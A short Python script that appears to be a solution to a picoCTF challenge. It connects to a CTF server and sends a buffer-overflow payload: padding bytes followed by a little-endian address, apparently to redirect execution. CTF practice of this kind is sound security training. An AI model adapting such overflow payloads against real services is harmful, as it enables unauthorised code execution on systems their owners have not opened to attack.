import socket

# Configuration
target_host = "saturn.picoctf.net"  # Replace with your server's IP
target_port = int(input("port number - "))        # Replace with your server's port

payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08\x0a"

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    response = client.recv(4096)
    print(f"Received: {response}")
    client.send(payload)
    print(f"succesfuly send {payload}")
    # client.shutdown(socket.SHUT_WR)
    response = client.recv(4096)
    print(f"Recived: {response}")
    response = client.recv(4096)
    print(response)
finally:
    client.close()
